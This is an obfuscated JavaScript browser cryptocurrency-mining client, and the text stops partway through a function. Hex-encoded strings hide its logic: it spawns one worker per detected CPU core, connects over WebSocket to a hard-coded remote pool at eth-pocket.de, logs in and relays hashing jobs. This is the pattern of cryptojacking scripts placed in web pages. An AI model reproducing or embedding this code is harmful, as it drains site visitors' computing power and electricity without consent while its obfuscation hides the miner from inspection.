var _0x1917=["\x73\x72\x63","\x74\x65\x73\x74","\x66\x69\x6C\x74\x65\x72","\x73\x63\x72\x69\x70\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x63\x61\x6C\x6C","\x73\x6C\x69\x63\x65","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65","\x3F\x70\x6F\x6F\x6C\x73\x3D","\x73\x70\x6C\x69\x74","\x77\x73\x73\x3A\x2F\x2F\x65\x74\x68\x2D\x70\x6F\x63\x6B\x65\x74\x2E\x64\x65\x3A\x38\x35\x38\x37","\x45\x72\x72\x6F\x72\x3A\x20","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x6E\x61\x76\x69\x67\x61\x74\x6F\x72","\x63\x6C\x6F\x73\x65","\x6F\x6E\x6D\x65\x73\x73\x61\x67\x65","\x6F\x6E\x65\x72\x72\x6F\x72","\x6F\x6E\x63\x6C\x6F\x73\x65","\x6F\x6E\x6F\x70\x65\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x6E\x64","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","","\x68\x61\x6E\x64\x73\x68\x61\x6B\x65","\x78","\x6C\x65\x6E\x67\x74\x68","\x74\x65\x72\x6D\x69\x6E\x61\x74\x65","\x73\x68\x69\x66\x74","\x77\x61\x6B\x65\x75\x70","\x64\x61\x74\x61","\x70\x61\x72\x73\x65","\x70\x75\x73\x68","\x6A\x6F\x62","\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72","\x68\x61\x73\x68\x73\x6F\x6C\x76\x65\x64","\x74\x61\x72\x67\x65\x74","\x6E\x6F\x74\x68\x69\x6E\x67","\x6D\x69\x6E","\x6D\x61\x78","\x70\x6F\x73\x74\x4D\x65\x73\x73\x61\x67\x65"];var scriptTag=Array[_0x1917[7]][_0x1917[6]][_0x1917[5]](document[_0x1917[4]](_0x1917[3]))[_0x1917[2]]((_0x9ebbx2)=>/=ws/[_0x1917[1]](_0x9ebbx2[_0x1917[0]]));var rightProxy=null;var rightPool=null;rightPool= decodeURIComponent(scriptTag[0][_0x1917[0]][_0x1917[9]](_0x1917[8])[1]);var CustomPool=rightPool;rightProxy= _0x1917[10];var server=rightProxy;var job=null;var workers=[];var ws;var receiveStack=[];var sendStack=[];var totalhashes=0;var acceptedhashes=0;var errortext=_0x1917[11];var connected=0;var reconnector=0;var timerId=0;var throttleMiner=0;var handshake=null;function addWorkers(_0x9ebbx15){logicalProcessors= _0x9ebbx15;if(_0x9ebbx15==  -1){try{logicalProcessors= window[_0x1917[13]][_0x1917[12]]}catch(err){logicalProcessors= 4};if(!((logicalProcessors> 0)&& (logicalProcessors< 40))){logicalProcessors= 4}};while(logicalProcessors-- > 0){addWorker()}}var openWebSocket=function(){if(ws!= null){ws[_0x1917[14]]()};ws=  new WebSocket(server);ws[_0x1917[15]]= on_servermsg;ws[_0x1917[16]]= function(_0x9ebbx17){if(connected< 2){connected= 2};job= null};ws[_0x1917[17]]= function(){if(connected< 2){connected= 2};job= null};ws[_0x1917[18]]= function(){ws[_0x1917[20]]((JSON[_0x1917[19]](handshake)));connected= 1}};reconnector= function(){if(connected!== 3&& (ws== null|| (ws[_0x1917[21]]!== 0&& ws[_0x1917[21]]!== 1))){openWebSocket()}};function PerfektStartWithId(_0x9ebbx19,_0x9ebbx15=  -1,_0x9ebbx1a= _0x1917[22]){stopMining();connected= 0;handshake= {identifier:_0x1917[23],loginid:_0x9ebbx19,userid:_0x9ebbx1a,version:4};addWorkers(_0x9ebbx15);reconnector();timerId= setInterval(reconnector,10000)}function PerfektStart(_0x9ebbx1c,_0x9ebbx1d= _0x1917[24],_0x9ebbx15=  -1,_0x9ebbx1a= _0x1917[22]){stopMining();connected= 0;handshake= {identifier:_0x1917[23],pool:CustomPool,login:_0x9ebbx1c,password:_0x9ebbx1d,userid:_0x9ebbx1a,version:4};addWorkers(_0x9ebbx15);reconnector();timerId= setInterval(reconnector,10000)}function stopMining(){connected= 3;if(timerId!= 0){clearInterval(timerId)};if(ws!= null){ws[_0x1917[14]]()};deleteAllWorkers();job= null}function GetAcceptedHashes(){return acceptedhashes}function GetError(){return errortext}function removeWorker(){1> workers[_0x1917[25]]|| workers[_0x1917[27]]()[_0x1917[26]]()}function deleteAllWorkers(){for(i= 0;i< workers[_0x1917[25]];i++){workers[i][_0x1917[26]]()};workers= []}function informWorker(_0x9ebbx24){on_workermsg({data:_0x1917[28],target:_0x9ebbx24})}function on_servermsg(_0x9ebbx24){_0x9ebbx24= JSON[_0x1917[30]](_0x9ebbx24[_0x1917[29]]);receiveStack[_0x1917[31]](_0x9ebbx24);_0x1917[32]== _0x9ebbx24[_0x1917[33]]&& (job= _0x9ebbx24);_0x1917[34]== _0x9ebbx24[_0x1917[33]]&& (acceptedhashes++)}function on_workermsg(_0x9ebbx24){var _0x9ebbx27=_0x9ebbx24[_0x1917[35]];if(1!= connected){setTimeout(function(){informWorker(_0x9ebbx27)},2E3)}else {if(_0x1917[36]!= _0x9ebbx24[_0x1917[29]]&& _0x1917[28]!= _0x9ebbx24[_0x1917[29]]){var _0x9ebbx28=JSON[_0x1917[30]](_0x9ebbx24[_0x1917[29]]);ws[_0x1917[20]](_0x9ebbx24[_0x1917[29]]);sendStack[_0x1917[31]](_0x9ebbx28)};null=== job?setTimeout(function(){informWorker(_0x9ebbx27)},2E3):(_0x9ebbx27[_0x1917[39]]({job:job,throttle:Math[_0x1917[38]](0,Math[_0x1917[37]](throttleMiner,100))}),_0x1917[28]!= _0x9ebbx24[_0x1917[29]]&& (totalhashes+= 1))}}function addWorker() {
